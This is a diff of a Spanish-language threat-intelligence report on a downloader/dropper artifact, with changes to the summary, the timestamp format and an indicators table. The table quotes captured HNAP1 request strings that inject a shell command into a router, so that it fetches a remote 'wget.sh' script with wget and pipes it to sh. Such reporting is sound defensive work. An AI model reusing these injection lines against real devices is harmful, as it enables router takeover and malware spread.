@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asociaron 2 comandos observados o extraídos.
+Artefacto identificado como ASCII text, with CRLF line terminators de 476 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 2 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:45:45+00:00`
+- **Registrado:** `2026-08-09T19:45:45.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,13 +53,13 @@ SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd /tmp;wget hxx
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.168.XXX | static_analysis |
-| ip | 91.92.40.XXX | static_analysis |
 | url | hxxp://91.92.40.XXX/wget.sh | strings |
 | url | hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/ | strings |
-| hash | a1d549856ad12170b71dc46649fdc072d0640925b8266effb0e69685f3637437 | static_analysis |
+| ip | 190.179.168.XXX | static_analysis |
+| ip | 91.92.40.XXX | static_analysis |
 | command | GET /HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dhnap2;busybox wget hxxp://91.92.40.XXX | strings |
 | command | SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dhnap2; | strings |
+| hash | a1d549856ad12170b71dc46649fdc072d0640925b8266effb0e69685f3637437 | static_analysis |
 | ip | 45.156.87.XXX | artifact_source |
 
 ## 🛡️ Nota de publicación
